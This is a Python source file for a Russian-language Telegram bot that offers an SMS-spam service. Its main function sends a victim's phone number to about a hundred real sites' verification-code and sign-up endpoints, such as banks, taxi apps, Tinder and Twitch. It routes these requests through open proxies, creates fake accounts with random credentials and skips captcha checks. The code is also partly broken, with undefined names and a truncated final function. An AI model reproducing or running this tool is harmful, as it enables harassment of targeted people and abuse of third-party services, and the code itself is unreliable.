# -*- coding: utf-8 -*-
import requests
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random
from threading import Thread
from random import choice

TOKEN = '' #BOT_TOKEN 

THREADS_LIMIT = 200

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = #YOUR_ID
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

def save_chat_id(chat_id):
	chat_id = str(chat_id)
	with open(chat_ids_file,"a+") as ids_file:
		ids_file.seek(0)

		ids_list = [line.split('\n')[0] for line in ids_file]

		if chat_id not in ids_list:
			ids_file.write(f'{chat_id}\n')
			ids_list.append(chat_id)
			print(f'New chat_id saved: {chat_id}')
		else:
			print(f'chat_id {chat_id} is already saved')
		users_amount[0] = len(ids_list)
	return


def send_message_users(message):

	def send_message(chat_id):
		data = {
			'chat_id': chat_id,
			'text': message
		}
		response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

	with open(chat_ids_file, "r") as ids_file:
		ids_list = [line.split('\n')[0] for line in ids_file]

	[send_message(chat_id) for chat_id in ids_list]
	bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


@bot.message_handler(commands=['start'])
def start(message):
	keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
	boom = types.KeyboardButton(text='Спам')
	stop = types.KeyboardButton(text='Остановить спам')
	info = types.KeyboardButton(text='️Информация')
	stats = types.KeyboardButton(text='Статистика')
	piar = types.KeyboardButton(text='Задонатить создателю')
    
	buttons_to_add = [boom, stop, info, stats, piar]


	keyboard.add(*buttons_to_add)
	bot.send_message(message.chat.id, 'Здравствуй, пользователь!\nПодпишись на наш канал: @b0dyak1n \nВыберите действие:',  reply_markup=keyboard)
	save_chat_id(message.chat.id)

iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

def send_for_number(phone):

		request_timeout = 0.00001
		_email = _name+f'{iteration}'+'@gmail.com'
		email = _name+f'{iteration}'+'@gmail.com'
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies={"http":"104.20.7.231:8080"})
			print('[+] Grab отправлено!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			print('[+] RuTaxi sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies={"http":"167.71.5.83:8080"})
			print('[+] BelkaCar sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone}, proxies={"http":"167.71.5.83:8080"})
			print('[+] StarPizzaCafe отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://mamamia.ua/api/auth/login', data={"phone": _phone}, proxies={"http":"167.71.5.83:8080"})
			print('[+] MamaMia отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +_phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false}, proxies={"http":"167.71.5.83:8080"})
			print('[+] Sushiwok отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}, proxies={"http":"167.71.5.83:8080"})
			print('[+] Tinder sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, proxies={"http":"167.71.5.83:8080"})
			print('[+] Karusel sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, proxies={"http":"52.149.71.249:80"})
			print('[+] Tinkoff отправлено!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')
			
		try:
			requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Dostavista отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] SportMaster отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		 
		try:
			requests.post('https://alfalife.cc/auth.php', data={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Alfalife отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone}, proxies={"http":"134.209.29.120:3128"})
			print('[+] KoronaPay отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"_phone","nextStep":"auth-otp","__typename":"FlowResponse"}}, proxies={"http":"52.149.71.249:80"})
			print('[+] Silpo отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,}, proxies={"http":"52.149.71.249:80"})
			print('[+] BTfair отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",}, proxies={"http":"52.149.71.249:80"})
			print('[+] GGbet отправлено!')
			time.sleep(0.1)
		except:
			print('[-]  не отправлено!')
		
		try:
			requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",}, proxies={"http":"52.149.71.249:80"})
			print('[+] ETM отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,}, proxies={"http":"52.149.71.249:80"})
			print('[+] TheLive отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			 
		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={}, proxies={"http":"52.149.71.249:80"})
			print('[+] MTS sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] MyGames sent!')
			time.sleep(0.1)
		except:
			print('[+] error in sent!')
		
		try:
			requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",}, proxies={"http":"52.149.71.249:80"})
			print('[+] Zoloto585 отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Kasta отправлено!')
			time.sleep(0.1)
		except:
			print('[-] Kasta Не отправлено!')
			
		try:
			requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Taxi-Ritm отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={"http":"154.16.202.22:3128"})
			print('[+] Mail.ru отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",}, proxies={"http":"52.149.71.249:80"})
			print('[+] Creditter отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,}, proxies={"http":"52.149.71.249:80"})
			print('[+] Ingos отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",}, proxies={"http":"52.149.71.249:80"})
			print('[+] Admiralxxx отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")}, proxies={"http":"52.149.71.249:80"})
			print('[+] Av отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] MTS отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] City24 отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] SushiMaster отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] MultiPlex отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] 3040 отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",}, proxies={"http":"52.149.71.249:80"})
			print('[+] Niyama отправлено!')
			time.sleep(0.1)
		except:
			print('[-] Niyama не отправлено!')
		
		try:
			requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] VSK отправлено!')
			time.sleep(0.1)
		except:
			print('[-] VSK не отправлено!')

		try:
			requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password}, proxies={"http":"52.149.71.249:80"})
			print('[+] EasyPay отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Fix-Price отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",}, proxies={"http":"52.149.71.249:80"})
			print('[+] NovaLinia отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"}, proxies={"http":"52.149.71.249:80"})
			print('[+] Tele2 отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Finam отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")}, proxies={"http":"52.149.71.249:80"})
			print('[+] MakiMaki отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True}, proxies={"http":"52.149.71.249:80"})
			print('[+] FlipKart отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Online.ua отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] PlanetaKino отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,}, proxies={"http":"52.149.71.249:80"})
			print('[+] OnTaxi отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
				
		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Iqos отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
			
		try:
			requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"}, proxies={"http":"52.149.71.249:80"})
			print('[+] Smart.Space отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] KFC отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
	   
		try:
			requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] tarantino-family отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",}, proxies={"http":"52.149.71.249:80"})
			print('[+] Apteka отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Uklon отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0}, proxies={"http":"52.149.71.249:80"})
			print('[+] Ozon отправлен!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",}, proxies={"http":"52.149.71.249:80"})
			print('[+] Banki отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
		
		try:
			requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone}, proxies={"http":"154.16.202.22:3128"})
			print('[+] IVI отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email}, proxies={"http":"52.149.71.249:80"})
			print('[+] Moyo отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')
	   
		try:
			requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"}, proxies={"http":"52.149.71.249:80"})
			print('[+] Helsi отправлено!')
			time.sleep(0.1)
		except:
			print('[+] не отправлено!')    
		
		try:
			requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1}, proxies={"http":"52.149.71.249:80"})
			print('[+] KinoLend отправлен!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'}, proxies={"http":"52.149.71.249:80"})
			print('[+] PizzaHut sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Rabota sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone}, proxies={"http":"154.16.202.22:3128"})
			print('[+] Rutube sent!')
			time.sleep(0.1)
		except:
			print('[-] Rutube in sent!')
	 
		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			print('[+] Citilink sent!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'}, proxies={"http":"52.149.71.249:80"})
			print('[+] Smsint sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			print('[+] oyorooms sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",}, proxies={"http":"52.149.71.249:80"})
			print('[+] MVIDEO sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}, proxies={"http":"52.149.71.249:80"})
			print('[+] newnext sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Sunlight sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}, proxies={"http":"52.149.71.249:80"})
			print('[+] alpari sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Invitro sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'}, proxies={"http":"52.149.71.249:80"})
			print('[+] Sberbank sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, proxies={"http":"52.149.71.249:80"})
			print('[+] Psbank sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, proxies={"http":"154.16.202.22:3128"})
			print('[+] Beltelcom sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] Karusel sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] KFC sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] Yandex.Chef sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] MTS отправлено!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, proxies={"http":"52.149.71.249:80"})
			print('[+] Delitime sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] findclone звонок отправлен!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}}, proxies={"http":"52.149.71.249:80"})
			print('[+] Guru sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies={"http":"154.16.202.22:3128"})
			print('[+] ICQ sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, proxies={"http":"52.149.71.249:80"})
			print('[+] InDriver sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Invitro sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Pmsm sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone}, proxies={"http":"154.16.202.22:3128"})
			print('[+] IVI sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone}, proxies={"http":"52.149.71.249:80"})
			print('[+] Lenta sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"}, proxies={"http":"154.16.202.22:3128"})
			print('[+] Mail.ru sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""},  proxies={"http":"52.149.71.249:80"})
			print('[+] MVideo sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] OK sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] qlean sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')
			
		try:
			requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))},  proxies={"http":"52.149.71.249:80"})
			print('[+] Qlean отправлено!')
			time.sleep(0.1)
		except:
			print('[-] не отправлено!')

		try:
			requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] SMSgorod sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] Tinder sent!')  
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username},  proxies={"http":"154.16.202.22:3128"})
			print('[+] Twitch sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'},  proxies={"http":"52.149.71.249:80"})
			print('[+] CabWiFi sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2},  proxies={"http":"52.149.71.249:80"})
			print('[+] wowworks sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone},  proxies={"http":"154.16.202.22:3128"})
			print('[+] Eda.Yandex sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone},  proxies={"http":"154.16.202.22:3128"})
			print('[+] Youla sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"},  proxies={"http":"52.149.71.249:80"})
			print('[+] Alpari sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone},  proxies={"http":"52.149.71.249:80"})
			print('[+] SMS sent!')
			time.sleep(0.1)
		except:
			print('[-] error in sent!')
            
        
def start_spam(chat_id, phone_number, force):
	running_spams_per_chat_id.append(chat_id)

